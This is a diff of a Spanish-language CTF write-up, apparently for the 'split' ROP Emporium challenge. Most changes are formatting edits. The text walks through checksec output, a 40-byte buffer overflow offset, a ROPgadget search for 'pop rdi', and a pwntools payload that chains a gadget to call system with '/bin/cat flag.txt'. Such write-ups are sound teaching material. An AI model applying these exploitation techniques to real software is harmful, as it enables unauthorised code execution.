@@ -11,7 +11,7 @@ excesivamente simple. Con esta serie de posts aprenderemos sobre una de las téc
 
 ## Reconocimiento
 
-Como siempre comenzamos lanzando [[checksec]]:
+Como siempre comenzamos lanzando *checksec*:
 
 ```checksec
 Arch:     amd64-64-little
@@ -21,9 +21,9 @@ NX:       NX enabled
 PIE:      No PIE (0x400000)
 ```
 
-Vemos que tan solo tiene el [[NX bit]], por lo que el ataque será probablemente mediante [[Return Oriented Programming|ROP]].
+Vemos que tan solo tiene el *NX bit*, por lo que el ataque será probablemente mediante técnicas de *ROP*.
 
-Analizando con [[gdb]]-[[pwndbg]]:
+Analizando con *gdb-pwndbg*:
 
 > **Funciones**
 ```gdb
@@ -93,7 +93,7 @@ Analizando con [[gdb]]-[[pwndbg]]:
 0x0000000000400752 <+16>:	ret
 ```
 
-Vemos que tenemos una vulnerabilidad de tipo [[Buffer overflow]], con [[pwntools|cyclic]] podemos calcular el offset, que en este caso es **40**.
+Vemos que tenemos una vulnerabilidad de tipo *Buffer overflow*. Con *cyclic* podemos calcular el offset, que en este caso es **40**.
 
 Vemos también que tenemos una función *usefulFunction*, que nos da una llamada a *system*. Sin embargo, en este caso, se llama a `"/bin/ls"`:
 
@@ -115,7 +115,7 @@ Searching for value: '/bin/cat'
 split           0x601060 '/bin/cat flag.txt'
 ```
 
-Solo nos queda buscar un gadget con [[ROPGadget]] (con [[ropper]] no aparecía):
+Solo nos queda buscar un gadget que nos haga el trabajo. En mi caso utilizaré *ROPGadget* (con *ropper* no aparecía):
 
 ```bash
 ROPgadget --binary split | grep "pop rdi"
@@ -162,3 +162,7 @@ payload = padding + p64(pop_rdi) + p64(bin_cat) + p64(syscall)
 io.send(payload)
 io.interactive()
 ```
+
+Al ejecutar nos dará la flag.
+
+Este es un reto sencillito para calentar e ir afianzando los conceptos base. ¡Nos vemos en el siguiente post!
